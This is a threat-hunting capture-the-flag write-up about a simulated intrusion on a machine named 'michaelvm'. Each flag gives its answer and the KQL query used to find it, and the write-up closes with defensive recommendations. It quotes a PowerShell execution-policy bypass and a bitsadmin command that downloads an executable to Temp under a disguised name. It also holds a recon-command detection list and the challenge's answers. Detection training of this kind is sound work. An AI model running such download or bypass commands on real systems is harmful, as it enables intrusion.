 # 🎯 Threat-Hunting-Scenario-Lurker

 📖 Scenario
The last incident was supposed to be over. One machine compromised, the attacker cut off before they could spread — or so we were told.
But something doesn’t sit right.
A new device started acting strangely. At first glance, it mirrored the earlier compromise: same tools, same timing, same surgical precision. Only this time, the logs were cleaner. Too clean. And yet, traces remained — scattered like breadcrumbs that weren’t meant to be found, or perhaps were meant to be followed.
Someone wants us to see this.
What if the first breach was a smokescreen? A proof of concept? What if this is the real operation?
Some say it’s just a red team op. Others whisper it’s something more — a buried framework that’s been lying dormant, waiting for its second trigger.
You’ve been given full access. But not the full story.
🎯 Your job is simple: Prove what really happened.
🧭 Follow the signs. Trust the data. Question everything.
Good luck, hunter.

🚩 Flag-by-Flag Breakdown
🟩 Flag 1 – Initial PowerShell Execution Detection
	•	What to Hunt: First suspicious PowerShell command execution.
	•	Answer:
	•	"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1" at 2025-06-16T05:38:07.9685093Z
	•	Query Used:
	•	DeviceProcessEvents | where DeviceName == "michaelvm" | where ProcessCommandLine contains "ps1" | project Timestamp, ProcessCommandLine, FileName, FolderPath | order by Timestamp asc

🟩 Flag 2 – Reconnaissance Script Hash
	•	What to Hunt: Reconnaissance commands in early execution stages.
	•	Answer:
	•	badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
	•	Query Used:
	•	DeviceProcessEvents | where DeviceName == "michaelvm" | where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-16T05:38:00Z)) | where ProcessCommandLine has_any (    "whoami", "hostname", "ipconfig", "systeminfo", "net user", "net group", "tasklist",    "netstat", "cmd.exe", "wmic", "reg query", "dsquery", "nltest", "Get-", "Invoke-", "for /f", "dir" ) or FileName has_any ("cmd.exe", "powershell.exe", "wmic.exe", "reg.exe", "dsquery.exe", "nltest.exe") | project Timestamp, FileName, ProcessCommandLine, SHA256, FolderPath, InitiatingProcessFileName | order by Timestamp asc

🟩 Flag 3 – Sensitive Document Access
	•	What to Hunt: Access to sensitive files (Board/Financials).
	•	Answer:
	•	QuarterlyCryptoHoldings.docx at 2025-06-16T05:59:03.478914Z
	•	Query Used:
	•	DeviceEvents | where DeviceName == "michaelvm" | where FolderPath contains "board" | where ActionType == "SensitiveFileRead"

🟩 Flag 4 – Last Manual Access to File
	•	What to Hunt: Last file open timestamp of the sensitive doc.
	•	Answer:
	•	2025-06-16T06:12:28.2856483Z
	•	Query Used: (Same as Flag 3)

🟩 Flag 5 – LOLBin Usage: bitsadmin
	•	What to Hunt: Use of bitsadmin to download payload.
	•	Answer:
	•	"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe at 2025-06-16T05:59:57.395276Z
	•	Query Used:
	•	DeviceProcessEvents | where DeviceName == "michaelvm" | where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z)) | where FileName contains "bitsadmin.exe" | order by Timestamp asc

🟩 Flag 6 – Suspicious Payload Deployment
	•	What to Hunt: Dropped .exe payload in unusual folder.
	•	Answer:
	•	ledger_viewer.exe at 2025-06-16T06:15:37.0446648Z
	•	Query Used:
	•	DeviceFileEvents | where DeviceName == "michaelvm" | where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z)) | where FileName endswith ".exe" | where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\", "\\Users\\Public\\") | project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp asc

(continues for Flags 7 through 17 in same pattern)

📅 Timeline Summary
	•	Initial Access – PowerShell from Temp on michaelvm
	•	Reconnaissance – Network/Host discovery
	•	Sensitive Data Access – Accessed QuarterlyCryptoHoldings.docx
	•	Payload Download – Using bitsadmin
	•	Execution – HTA via mshta
	•	Persistence – Registry Run key + Scheduled Task
	•	Lateral Movement – Pivot to centralsrvr
	•	Exfiltration – Pastebin, Dropbox endpoints
	•	Anti-Forensics – PowerShell downgrade and log wiping

✅ Conclusion
The attacker leveraged native tools and LOLBins to evade detection, accessed high-value documents, and stealthily exfiltrated them while maintaining persistence. The clean logs indicate deliberate obfuscation and anti-forensic effort.

🛡️ Recommendations
	•	Block LOLBins like bitsadmin, mshta via AppLocker or WDAC
	•	Enable script block logging and AMSI
	•	Monitor for PowerShell downgrade attempts (-Version 2)
	•	Watch for registry changes in autorun paths
	•	Alert on suspicious scheduled task creation
	•	Monitor public cloud uploads (e.g. Dropbox, Pastebin)

🧾 Attribution
Threat simulation: Red Team Exercise Analysis: [Your Name] 📁 Repo: github.com/yourhandle/threat-hunting

“Attackers hide in noise. But sometimes, they hide in silence.”
